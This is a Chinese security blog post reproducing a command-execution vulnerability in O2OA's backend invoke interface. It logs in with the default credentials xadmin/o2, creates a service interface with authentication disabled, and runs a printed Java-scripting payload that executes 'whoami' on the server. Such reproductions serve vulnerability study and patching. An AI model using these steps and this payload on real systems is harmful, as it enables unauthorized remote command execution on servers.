<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Cd-nBHoaH0bUtkLkP3-ZoQ)

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC4O4dl1Y2a9LqiatyWWqR5TBWaDXM0urygClfibLafuVPWuLTpG6XGf1RlxhKke6Km9ys61OSkRiagzw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

 **文章声明**

  

安全技术类文章仅供参考，此文所提供的信息仅针对漏洞靶场进行渗透，**未经授权****请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。**

本文所提供的工具仅用于学习，禁止用于其他目的，推荐大家在了解技术原理的前提下，更好的维护个人信息安全、企业安全、国家安全。

一、漏洞描述
------

O2OA 是一款 Java 开源企业信息化建设平台，包括流程管理、门户管理、信息管理、数据管理和服务管理五大平台，可以极大程度上减化企业信息化建设成本和业务应用开发难度。O2OA 系统后台的 invoke 接口存在命令执行漏洞，攻击者通过该漏洞可以获取服务器权限。

二、漏洞复现
------

系统地址及其首页显示如下

```
var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()));
var result = [];
while (true) {
  var oneline = bufReader.readLine();
  result.push(oneline);
  if (!oneline) break;
}
var result = { "Result": result };
this.response.setBody(result, "application/json");
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nNlGegNl7Zb4Suib5KahNo0ZicEbQMn3Dib67w20rQnkt9I9KyOqqG5yP6PkFFxnAmAMCeUqicRTx4HYQ/640?wx_fmt=jpeg)

输入默认账户密码登录系统  `xadmin/o2`，后台显示如下

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nNlGegNl7Zb4Suib5KahNo0ZfuhI4hKhRBwew9kYXxhZUFmS0f0KO03FX7KCzyH7IHDvvibeIF9Mbag/640?wx_fmt=jpeg)

点击左上角的 logo 图标，选择进入服务管理

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nNlGegNl7Zb4Suib5KahNo0ZSzicNHibXJ7ZUx0f98Lb63NeWCcc7eibTJ7Utcd1HIUS18aGOU6MeAnyQ/640?wx_fmt=jpeg)

在服务管理的接口配置中选择 cmd 接口

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nNlGegNl7Zb4Suib5KahNo0ZVXvF0Jgy4icf2tjscNfJwKZn8MCNNibbwQo7Xib5Y5TNuVMmkTXZC5qpQ/640?wx_fmt=jpeg)

复制如下执行 `whoami` 命令的代码，并选择启用鉴权为否

```
var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()));
var result = [];
while (true) {
  var oneline = bufReader.readLine();
  result.push(oneline);
  if (!oneline) break;
}
var result = { "Result": result };
this.response.setBody(result, "application/json");
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nNlGegNl7Zb4Suib5KahNo0Z9OCeUSSQ4g36Qk7aL2xHYOr4UObfeoQ6QYG3MF2rxuhosiciaMj3oTibg/640?wx_fmt=jpeg)

保存后点击运行即可得到命令执行的回显，结果如下  

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nNlGegNl7Zb4Suib5KahNo0Z7ZA4S2okGj3JgibzcOHsdf0dSb48Lg2tLoUBqNQp713RP65sEictk97A/640?wx_fmt=jpeg)